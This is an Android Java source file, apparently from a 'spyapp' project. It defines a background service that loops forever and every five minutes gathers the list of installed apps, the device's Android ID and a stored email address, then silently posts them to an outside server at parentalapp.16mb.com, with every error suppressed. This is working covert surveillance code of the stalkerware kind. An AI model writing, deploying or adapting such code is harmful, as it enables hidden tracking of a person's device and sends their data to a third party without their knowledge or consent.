package com.example.vipul.spyapp10;

import android.app.Service;
import android.content.Intent;
import android.content.pm.PackageInfo;
import android.os.AsyncTask;
import android.os.IBinder;
import android.provider.Settings;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.apache.http.util.EntityUtils;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.List;

public class packageInfoService extends Service {
    public packageInfoService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }
    @Override
    public void onStart(Intent intent, int startId) {
        super.onStart(intent, startId);

        final Thread runnable = new Thread() {
            @Override
            public void run() {
                while (true) {
                    try {
                        packageInfo();
                        sleep(300000);
                    } catch (Exception e) {
                    }
                }
            }
        };
        runnable.start();
    }
    @Override
    public void onDestroy() {
        super.onDestroy();
    }
    public void packageInfo() {
        try {
            List<PackageInfo> apps = getPackageManager().getInstalledPackages(0);
            String appname = "", pname = "";
            for (int i = 0; i < apps.size(); i++) {
                PackageInfo p = apps.get(i);
                appname += p.applicationInfo.loadLabel(getPackageManager()).toString() + "||";
                pname += p.packageName + "||";
            }
            String DeviceId = Settings.Secure.getString(this.getContentResolver(), Settings.Secure.ANDROID_ID) ;
            String Email=MainActivity.EMAIL;
            new UpdateUserDetailPACKAGE().execute(Email, DeviceId, appname, pname);
        }catch (Exception e) {
        }
    }
    private class UpdateUserDetailPACKAGE extends AsyncTask<String, Void, JSONObject> {
        @Override
        protected JSONObject doInBackground(String... params) {
            JSONObject mJSONResponse = null;
            try {
                HttpClient mClient = new DefaultHttpClient();
                HttpPost httpPost = new HttpPost("http://parentalapp.16mb.com/pack.php");
                List<NameValuePair> nameValuePair = new ArrayList<NameValuePair>(4);
                nameValuePair.add(new BasicNameValuePair("email", params[0]));
                nameValuePair.add(new BasicNameValuePair("did", params[1]));
                nameValuePair.add(new BasicNameValuePair("name", params[2]));
                nameValuePair.add(new BasicNameValuePair("pack", params[3]));
                httpPost.setEntity(new UrlEncodedFormEntity(nameValuePair));
                HttpResponse mResponse = mClient.execute(httpPost);
                String mJResponse = EntityUtils.toString(mResponse.getEntity());
                mJSONResponse = new JSONObject(mJResponse);
            } catch (Exception e) {
            }
            return mJSONResponse;
        }

        @Override
        protected void onPostExecute(JSONObject jsonObject) {
            super.onPostExecute(jsonObject);
        }
    }
}
